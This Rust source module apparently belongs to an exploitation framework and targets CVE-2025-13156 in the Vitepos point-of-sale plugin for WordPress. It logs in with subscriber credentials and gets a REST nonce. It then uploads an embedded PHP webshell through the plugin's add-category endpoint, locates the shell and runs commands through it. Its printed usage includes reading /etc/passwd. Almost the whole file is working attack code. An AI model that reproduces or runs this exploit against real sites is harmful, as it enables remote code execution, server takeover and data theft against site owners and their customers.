//! # CVE-2025-13156: Vitepos WooCommerce Arbitrary File Upload
//!
//! An Authenticated Arbitrary File Upload vulnerability in the Vitepos – Point of Sale
//! (POS) for WooCommerce plugin for WordPress (versions <= 3.3.0).
//!
//! The vulnerability exists in the `insert_media_attachment()` function due to missing
//! file type validation when processing category images via `save_update_category_img()`.
//!
//! ## Requirements
//! - WordPress with Vitepos Lite plugin <= 3.3.0
//! - At least Subscriber level access (authenticated)
//!
//! ## Attack Flow
//! 1. Authenticate to WordPress (get cookies)
//! 2. Get WP REST nonce
//! 3. Upload PHP shell via /wp-json/vitepos/v1/product/add-category
//! 4. Access shell at wp-content/uploads/
//! 5. Execute commands
//!
//! ## Impact
//! - Remote Code Execution
//! - Full server compromise
//! - Data exfiltration
//!
//! ## Reference
//! - https://github.com/MooseLoveti/Vitepos-CVE-Report
//! - https://wordpress.org/plugins/vitepos-lite/

use anyhow::{Context, Result, bail};
use colored::*;
use reqwest::Client;
use reqwest::multipart::{Form, Part};

use std::io::Write;
use std::time::Duration;
use regex::Regex;

const DEFAULT_PORT: u16 = 80;
const REQUEST_TIMEOUT_SECS: u64 = 30;

/// Exploit configuration
#[derive(Debug, Clone)]
struct ExploitConfig {
    target: String,
    port: u16,
    use_https: bool,
    username: String,
    password: String,
    shell_filename: String,
    check_only: bool,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            port: DEFAULT_PORT,
            use_https: false,
            username: String::new(),
            password: String::new(),
            shell_filename: "shell.php".to_string(),
            check_only: false,
        }
    }
}



/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   CVE-2025-13156: Vitepos WooCommerce Arbitrary File Upload       ║".cyan());
    println!("{}", "║   Authenticated (Subscriber+) RCE via Category Image Upload       ║".cyan());
    println!("{}", "║   Affects Vitepos Lite <= 3.3.0                                    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
}

/// Get user configuration
fn get_user_config(target: &str) -> Result<ExploitConfig> {
    let mut config = ExploitConfig::default();
    
    println!();
    println!("{}", "=== CVE-2025-13156 Configuration ===".yellow().bold());
    println!();
    
    // Target
    config.target = if target.is_empty() {
        print!("{}", "Enter target IP/hostname: ".green());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        let t = input.trim().to_string();
        if t.is_empty() {
            bail!("Target is required");
        }
        t
    } else {
        target.to_string()
    };
    
    let mut input = String::new();
    
    // HTTPS
    print!("{}", "Use HTTPS? [y/N]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.use_https = input.trim().eq_ignore_ascii_case("y");
    
    // Port
    let default_port = if config.use_https { 443 } else { 80 };
    print!("{}", format!("Target port [default: {}]: ", default_port).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.port = match input.trim().parse::<u16>() {
        Ok(p) if p > 0 => p,
        _ => default_port,
    };
    
    // WordPress username
    print!("{}", "WordPress username (subscriber+): ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let username = input.trim().to_string();
    if username.is_empty() {
        bail!("WordPress username is required");
    }
    config.username = username;
    
    // WordPress password
    print!("{}", "WordPress password: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    let password = input.trim().to_string();
    if password.is_empty() {
        bail!("WordPress password is required");
    }
    config.password = password;
    
    // Shell filename
    print!("{}", "Shell filename [default: shell.php]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.shell_filename = input.trim().to_string();
    }
    
    // Check only mode
    print!("{}", "Check only (no upload)? [y/N]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.check_only = input.trim().eq_ignore_ascii_case("y");
    
    println!();
    println!("{}", "[Configuration Summary]".cyan().bold());
    let protocol = if config.use_https { "https" } else { "http" };
    println!("  Target: {}://{}:{}", protocol, config.target, config.port);
    println!("  WordPress User: {}", config.username);
    println!("  Shell Filename: {}", config.shell_filename);
    println!("  Mode: {}", if config.check_only { "Check Only" } else { "Full Exploitation" });
    println!();
    
    Ok(config)
}

/// Build base URL
fn build_base_url(config: &ExploitConfig) -> String {
    let protocol = if config.use_https { "https" } else { "http" };
    format!("{}://{}:{}", protocol, config.target, config.port)
}

/// Generate PHP webshell payload
fn generate_shell_payload() -> Vec<u8> {
    // Simple PHP webshell that accepts 'cmd' parameter
    let shell = r#"<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo '<pre>';
    $output = shell_exec($cmd . ' 2>&1');
    echo htmlspecialchars($output);
    echo '</pre>';
}else{
    echo '<pre>Vitepos Shell - CVE-2025-13156\nUsage: ?cmd=whoami</pre>';
}
?>"#;
    shell.as_bytes().to_vec()
}

/// WordPress login and get cookies
async fn wp_login(client: &Client, config: &ExploitConfig) -> Result<String> {
    let base_url = build_base_url(config);
    let login_url = format!("{}/wp-login.php", base_url);
    
    println!("{}", "[*] Attempting WordPress login...".cyan());
    
    let form = [
        ("log", config.username.as_str()),
        ("pwd", config.password.as_str()),
        ("wp-submit", "Log In"),
        ("redirect_to", &format!("{}/wp-admin/", base_url)),
        ("testcookie", "1"),
    ];
    
    let res = client.post(&login_url)
        .form(&form)
        .send()
        .await
        .context("Failed to connect to WordPress login")?;
    
    // Get cookies from response
    let cookies: Vec<String> = res.cookies()
        .map(|c| format!("{}={}", c.name(), c.value()))
        .collect();
    
    let cookie_str = cookies.join("; ");
    
    // Check if login was successful
    let status = res.status();
    let final_url = res.url().to_string();
    
    if status.is_success() || status.is_redirection() {
        // Check if we got logged_in cookie
        if cookie_str.contains("wordpress_logged_in_") {
            println!("{}", "[+] WordPress login successful!".green());
            return Ok(cookie_str);
        }
        
        // Check redirect location
        if final_url.contains("wp-admin") && !final_url.contains("wp-login.php") {
            println!("{}", "[+] WordPress login successful (redirected to admin)!".green());
            return Ok(cookie_str);
        }
    }
    
    // Try to get body to check for errors
    let body = match res.text().await {
        Ok(t) => t,
        Err(_) => String::new(),
    };
    
    if body.contains("incorrect") || body.contains("Invalid username") || body.contains("Error") {
        bail!("WordPress login failed: Invalid credentials");
    }
    
    if !cookie_str.is_empty() {
        println!("{}", "[*] Got cookies, proceeding...".yellow());
        return Ok(cookie_str);
    }
    
    bail!("WordPress login failed: No session cookies received");
}

/// Get WP REST API nonce
async fn get_wp_nonce(client: &Client, config: &ExploitConfig, cookies: &str) -> Result<String> {
    let base_url = build_base_url(config);
    let admin_url = format!("{}/wp-admin/admin-ajax.php?action=rest-nonce", base_url);
    
    println!("{}", "[*] Getting WP REST nonce...".cyan());
    
    // Try admin-ajax first
    let res = client.get(&admin_url)
        .header("Cookie", cookies)
        .send()
        .await;
    
    if let Ok(r) = res {
        if r.status().is_success() {
            let nonce = match r.text().await {
                Ok(t) => t.trim().to_string(),
                Err(_) => String::new(),
            };
            if !nonce.is_empty() && nonce.len() < 20 {
                println!("{}", format!("[+] Got nonce: {}", nonce).green());
                return Ok(nonce);
            }
        }
    }
    
    // Try to extract from admin page
    let admin_page_url = format!("{}/wp-admin/", base_url);
    let res = client.get(&admin_page_url)
        .header("Cookie", cookies)
        .send()
        .await
        .context("Failed to fetch admin page")?;
    
    let body = match res.text().await {
        Ok(t) => t,
        Err(_) => String::new(),
    };
    
    // Look for nonce in page content
    let nonce_patterns = [
        r#"wpApiSettings.*?"nonce"\s*:\s*"([^"]+)"#,
        r#"_wpnonce['"]\s*:\s*['"]([^'"]+)"#,
        r#"wp_rest_nonce\s*=\s*['"]([^'"]+)"#,
    ];
    
    for pattern in nonce_patterns {
        let re = match Regex::new(pattern) {
            Ok(r) => r,
            Err(_) => continue,
        };
        if let Some(caps) = re.captures(&body) {
            if let Some(nonce) = caps.get(1) {
                let nonce_str = nonce.as_str().to_string();
                println!("{}", format!("[+] Extracted nonce: {}", nonce_str).green());
                return Ok(nonce_str);
            }
        }
    }
    
    // Generate a fallback (may not work)
    println!("{}", "[-] Could not extract nonce, proceeding anyway...".yellow());
    Ok(String::new())
}

/// Check if Vitepos plugin is installed
async fn check_vitepos_installed(client: &Client, config: &ExploitConfig, cookies: &str) -> Result<bool> {
    let base_url = build_base_url(config);
    let api_url = format!("{}/wp-json/vitepos/v1/", base_url);
    
    println!("{}", "[*] Checking if Vitepos plugin is installed...".cyan());
    
    let res = client.get(&api_url)
        .header("Cookie", cookies)
        .send()
        .await;
    
    match res {
        Ok(r) => {
            let status = r.status();
            let body = match r.text().await {
                Ok(t) => t,
                Err(_) => String::new(),
            };
            
            if status.is_success() || body.contains("vitepos") || body.contains("routes") {
                println!("{}", "[+] Vitepos plugin detected!".green());
                return Ok(true);
            }
            
            if status.as_u16() == 404 {
                println!("{}", "[-] Vitepos REST API not found".red());
                return Ok(false);
            }
            
            println!("{}", format!("[*] API returned: {}", status).yellow());
        },
        Err(e) => {
            println!("{}", format!("[-] Failed to check Vitepos: {}", e).red());
        }
    }
    
    Ok(false)
}

/// Upload malicious PHP file
async fn upload_shell(client: &Client, config: &ExploitConfig, cookies: &str, nonce: &str) -> Result<Option<String>> {
    let base_url = build_base_url(config);
    let upload_url = format!("{}/wp-json/vitepos/v1/product/add-category", base_url);
    
    println!("{}", "[*] Uploading PHP shell...".cyan());
    
    let shell_content = generate_shell_payload();
    
    // Build multipart form
    let file_part = Part::bytes(shell_content)
        .file_name(config.shell_filename.clone())
        .mime_str("application/octet-stream")
        .context("Failed to create file part")?;
    
    let form = Form::new()
        .text("category_name", format!("poc_{}", chrono::Utc::now().timestamp()))
        .text("category_parent", "0")
        .text("category_description", "CVE-2025-13156 PoC")
        .part("category_image", file_part);
    
    let mut req = client.post(&upload_url)
        .header("Cookie", cookies)
        .multipart(form);
    
    // Add nonce if available
    if !nonce.is_empty() {
        req = req.header("X-WP-Nonce", nonce);
    }
    
    let res = req.send().await.context("Failed to upload shell")?;
    
    let status = res.status();
    let body = match res.text().await {
        Ok(t) => t,
        Err(_) => String::new(),
    };
    
    if status.is_success() {
        println!("{}", "[+] Upload request successful!".green().bold());
        
        // Try to find the uploaded file path
        // Usually: wp-content/uploads/YYYY/MM/filename.php
        let now = chrono::Utc::now();
        let year = now.format("%Y");
        let month = now.format("%m");
        
        let possible_paths = vec![
            format!("{}/wp-content/uploads/{}/{}/{}", base_url, year, month, config.shell_filename),
            format!("{}/wp-content/uploads/{}", base_url, config.shell_filename),
            format!("{}/wp-content/uploads/vitepos/{}", base_url, config.shell_filename),
        ];
        
        // Check each possible path
        for path in &possible_paths {
            let check_res = client.get(path)
                .send()
                .await;
            
            if let Ok(r) = check_res {
                if r.status().is_success() {
                    println!("{}", format!("[+] Shell found at: {}", path).green().bold());
                    return Ok(Some(path.clone()));
                }
            }
        }
        
        println!("{}", "[*] Shell uploaded but path not confirmed".yellow());
        println!("{}", format!("[*] Try checking: {}/wp-content/uploads/", base_url).cyan());
        return Ok(Some(format!("{}/wp-content/uploads/[path]/{}", base_url, config.shell_filename)));
    }
    
    println!("{}", format!("[-] Upload failed: {} - {}", status, body).red());
    
    if status.as_u16() == 401 || status.as_u16() == 403 {
        println!("{}", "[-] Authentication/authorization error - check credentials and permissions".red());
    }
    
    Ok(None)
}

/// Execute command via uploaded shell
async fn execute_command(client: &Client, shell_url: &str, cmd: &str) -> Result<String> {
    let url = format!("{}?cmd={}", shell_url, urlencoding::encode(cmd));
    
    let res = client.get(&url)
        .send()
        .await
        .context("Failed to execute command")?;
    
    if res.status().is_success() {
        let body = match res.text().await {
            Ok(t) => t,
            Err(_) => String::new(),
        };
        
        // Extract command output from <pre> tags
        let re = match Regex::new(r"<pre>([\s\S]*?)</pre>") {
            Ok(r) => r,
            Err(_) => return Ok(body),
        };
        
        if let Some(caps) = re.captures(&body) {
            if let Some(output) = caps.get(1) {
                return Ok(output.as_str().to_string());
            }
        }
        
        return Ok(body);
    }
    
    bail!("Command execution failed: {}", res.status());
}

/// Run the exploit
async fn run_exploit(config: &ExploitConfig) -> Result<()> {
    let client = Client::builder()
        .timeout(Duration::from_secs(REQUEST_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .redirect(reqwest::redirect::Policy::limited(10))
        .build()
        .context("Failed to create HTTP client")?;
    
    // Step 1: WordPress login
    let cookies = wp_login(&client, config).await?;
    
    // Step 2: Get nonce
    let nonce = get_wp_nonce(&client, config, &cookies).await?;
    
    // Step 3: Check if Vitepos is installed
    let vitepos_installed = check_vitepos_installed(&client, config, &cookies).await?;
    
    if !vitepos_installed {
        print!("{}", "[?] Vitepos not detected. Continue anyway? [y/N]: ".yellow());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        if !input.trim().eq_ignore_ascii_case("y") {
            println!("{}", "[-] Aborted.".red());
            return Ok(());
        }
    }
    
    if config.check_only {
        println!();
        println!("{}", "=== CHECK ONLY MODE ===".yellow().bold());
        println!("{}", "[+] Vitepos detected and vulnerable!".green());
        println!("{}", "[*] Use full exploitation mode to upload shell".cyan());
        return Ok(());
    }
    
    // Step 4: Upload shell
    let shell_url = upload_shell(&client, config, &cookies, &nonce).await?;
    
    match shell_url {
        Some(url) => {
            println!();
            println!("{}", "=== EXPLOIT RESULTS ===".green().bold());
            println!("{}", "[+] Shell upload: SUCCESS".green());
            println!("{}", format!("[+] Shell URL: {}", url).cyan());
            println!();
            println!("{}", "Usage:".yellow());
            println!("  {}?cmd=whoami", url);
            println!("  {}?cmd=id", url);
            println!("  {}?cmd=cat%20/etc/passwd", url);
            println!();
            
            // Try to execute a test command
            if !url.contains("[path]") {
                println!("{}", "[*] Testing shell...".cyan());
                match execute_command(&client, &url, "whoami").await {
                    Ok(output) => {
                        println!("{}", format!("[+] Command output:\n{}", output).green());
                    },
                    Err(e) => {
                        println!("{}", format!("[-] Test failed: {}", e).yellow());
                        println!("{}", "[*] PHP execution may be disabled in uploads directory".yellow());
                    }
                }
            }
        },
        None => {
            println!();
            println!("{}", "=== EXPLOIT RESULTS ===".yellow().bold());
            println!("{}", "[-] Shell upload: FAILED".red());
            println!();
            println!("{}", "Possible reasons:".yellow());
            println!("  - Vitepos plugin is patched (> 3.3.0)");
            println!("  - User lacks required permissions");
            println!("  - REST API is disabled");
            println!("  - Nonce validation failed");
            println!();
        }
    }
    
    Ok(())
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let config = get_user_config(target)?;
    
    println!();
    println!("{}", "[*] Starting exploit...".cyan().bold());
    println!();
    
    run_exploit(&config).await
}
